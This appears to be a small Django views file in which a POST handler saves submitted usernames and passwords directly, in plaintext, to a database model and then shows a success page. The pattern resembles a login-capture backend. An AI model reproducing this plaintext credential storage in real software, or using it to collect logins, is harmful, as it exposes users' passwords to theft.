from django.shortcuts import render
from .models import Index

# Create your views here.
def index(request):
    return render(request,'pages/index.html')
def error(request):
    return render(request,'pages/error.html')
def success(request):
    if request.method=="POST":
        username = request.POST["username"]
        password = request.POST["password"]
        index = Index.objects.create(username=username, password=password) 
        index.save() 
        # context ={
        #     'username' : username,
        #     'password' : password
        # }
        return render(request,'pages/success.html')
    return render(request,'pages/success.html')